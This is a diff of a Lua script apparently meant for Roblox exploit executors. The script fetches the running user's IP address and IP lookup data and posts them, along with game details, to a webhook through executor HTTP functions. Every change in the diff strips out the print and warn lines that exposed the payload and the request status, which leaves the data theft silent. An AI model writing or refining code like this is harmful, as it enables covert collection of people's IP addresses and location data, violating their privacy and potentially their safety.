@@ -85,7 +85,7 @@ end)
 if successIp then
     GetIp = resultIp
 else
-    warn("IP alma hatası: ", resultIp)
+    
 end
 
 local successData, resultData = pcall(function()
@@ -94,7 +94,7 @@ end)
 if successData then
     GetData = resultData
 else
-    warn("IP verisi alma hatası: ", resultData)
+    
 end
 
 -- Oyun Bilgileri
@@ -134,7 +134,7 @@ local function createWebhookData()
     )
 
     if #description > 4096 then
-        warn("Embed description too long: ", #description, " characters")
+        
         description = description:sub(1, 4090) .. "..."
     end
 
@@ -169,7 +169,7 @@ local function createWebhookData()
         }
     }
     local encodedData = HttpService:JSONEncode(data)
-    print("Webhook payload: ", encodedData)
+    
     return encodedData
 end
 
@@ -181,9 +181,9 @@ local function sendWebhook(webhookUrl, data)
         }
         
         local request = http_request or syn and syn.request or request or HttpPost
-        print("HTTP request function:", request and "Available" or "Not available")
+        
         if not request then
-            warn("No HTTP request function available")
+            
             return
         end
 
@@ -194,32 +194,31 @@ local function sendWebhook(webhookUrl, data)
             Body = data
         })
 
-        print("Webhook response status: ", response and response.StatusCode or "No status")
-        print("Webhook response body: ", response and response.Body or "No body")
+
         
         if response and response.StatusCode == 204 then
-            print("Webhook sent successfully")
+            
         elseif response and response.StatusCode == 400 then
-            warn("Bad request (400). Check JSON payload for invalid fields or URLs.")
+            
         elseif response and response.StatusCode == 404 then
-            warn("Webhook URL is invalid (404). Please verify the URL.")
+            
         else
-            warn("Failed to send webhook, status: ", response and response.StatusCode or "Unknown")
+            
         end
     end)
     
     if not success then
-        warn("Error sending webhook: ", result)
+        
     end
 end
 
 -- Scripti Çalıştırma
 local success, webhookData = pcall(createWebhookData)
 if success then
-    print("Webhook data created successfully")
+    
     sendWebhook(webhookUrl, webhookData)
 else
-    warn("Error creating webhook data: ", webhookData)
+    
 end
 
 
